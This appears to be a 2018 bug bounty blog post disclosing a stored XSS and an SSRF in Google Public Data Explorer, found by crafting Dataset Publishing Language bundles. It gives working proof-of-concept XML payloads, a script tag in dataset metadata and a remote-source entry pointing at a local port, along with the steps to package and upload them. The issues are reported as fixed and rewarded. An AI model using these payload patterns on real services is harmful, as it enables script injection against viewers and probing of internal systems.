---
layout: post
title:  "Stored XSS, and SSRF in Google using the Dataset Publishing Language"
date:   2018-03-07 10:00:00
categories: dspl
---

> "Those who rule data will rule the entire world." - 孫正義

TLDR; Crafting **Dataset Publishing Language** bundles to get **stored XSS** in the context of **www.google.com**, and using the DSPL remote sources functionality to access local services (**SSRF**). 

The [Google Public Data Explorer](https://www.google.com/publicdata/directory) is a tool to make large datasets easy to explore and visualize. eg., Visualizing Health expenditure, World Bank data (% of government expenditure).
![Image](/assets/dspl/explorer.gif)

Dataset Publishing Language (DSPL) uses XML to describe the dataset metadata and uses CSV data files: eg., sample.zip

{% highlight xml %}
Archive:  sample.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      246  02-01-2018 13:19   countries.csv
      221  02-14-2011 17:13   country_slice.csv
     7812  03-04-2018 21:12   dataset.xml
      246  02-14-2011 17:13   gender_country_slice.csv
       28  01-29-2018 20:55   genders.csv
      200  02-14-2011 17:13   state_slice.csv
      300  01-29-2018 21:11   states.csv
---------                     -------
     9053                     7 files
{% endhighlight %}

The issue here was that Google Public Data Explorer would use some supplied metadata in the dataset archive without context aware encoding or validation. 

eg., using a sample dataset:
* __curl https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dspl/tutorial1.0.zip -o sample.zip__
* __unzip sample.zip; rm sample.zip__

Modifying the metadata name value of dataset.xml. The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
{% highlight xml %}
<info>
  <name>
    <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
  </name>
    <description>
      <value>Some very interesting statistics about countries</value>
    </description>
    <url>
      <value>http://google.com</value>
    </url>  
</info>
{% endhighlight %}

* __zip -r poc.dspl *__
* __Upload the dataset to Google Public Data Explorer, and share it publically.__

So anyone who viewed the shared dataset would execute an attackers arbitrary JavaScript in the context of the www.google.com domain. (eg., coinhive 🤔)

Short video showing how this worked before it was fixed. Allows stored XSS in the context of www.google.com using DSPL:
<p><iframe src="https://player.vimeo.com/video/258923005" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></p>

Dataset Publishing Language also has functionality to allow data to be retrieved from [remote HTTP or FTP sources](https://developers.google.com/public-data/docs/cookbook#remote_data). This functionality allowed SSRF (server-side request forgery) to access localhost service resources (potentially also allows access to internal, non internet accessible systems/devices).  

eg., contents of poc.dspl/dataset.xml
{% highlight xml %}
<table id="my_table">
  <column id="first" type="string"/>
  <column id="last" type="string"/>
  <data>
    <file format="csv" encoding="utf-8">ftp://0.0.0.0:22</file>
  </data>
</table>
{% endhighlight %}

Uploading this dataset would return the response of the HTTP/FTP request in the resulting error condition responses. eg., 

![Image](/assets/dspl/ftp-tcp22.png)
In this example it shows the local SSH banner response which is a service that is not publically accessible.

This was fun to look into when I took some time off in January. Thanks to [@sirdarckcat](https://twitter.com/sirdarckcat) and the Google Security team for the great VRP! If anyone reads this and finds stuff that I missed, you should let me know. 😅  [@signalchaos](https://twitter.com/signalchaos)

Thanks for reading, 👋 

Disclosure timeline stuff:
* Jan 2018: Reported to Google
* Feb 2018: Verified that the reported issues were fixed
* Feb 2018: Rewarded $5,000 for Stored XSS
* Mar 2018: Rewarded $13,337 for SSRF